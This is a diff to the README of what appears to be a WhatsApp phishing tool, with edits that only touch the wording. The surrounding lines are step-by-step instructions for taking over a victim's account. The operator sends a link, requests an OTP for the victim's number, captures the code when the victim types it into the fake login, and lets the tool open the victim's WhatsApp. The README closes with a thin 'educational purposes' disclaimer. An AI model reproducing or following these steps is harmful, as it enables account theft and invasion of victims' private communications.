@@ -46,13 +46,13 @@ bash install.sh
 
 - *wait for the victim to click the link*
 
-- *when the victim clicks on the link you'll see a message "victim connected"*
+- *when the victim clicks on the link you'll see a message "<kbd>victim connected</kbd>"*
 
 - *then open the second whatsapp and enter your victim's whatsapp number click send otp*
 
 - *return to your terminal*
 
-- *if victim victim enter the otp and clicks login you'll see a message like (OTP: xxxxxx) you don't need to enter the otp because this tool automatically open whatsapp*
+- *if victim enters the otp and clicks login you'll see a message like (OTP: xxxxxx) you don't need to enter the otp because this tool automatically open whatsapp*
 
 - *if auto open is not working then enter the otp by yourself*
 
@@ -89,7 +89,7 @@ bash install.sh
 
 <kbd>
 
-_this was made for educational purposes_
+_this tool was made for educational purpose_
 
 _and im not responsible for any illegal activities done with this tool_
 
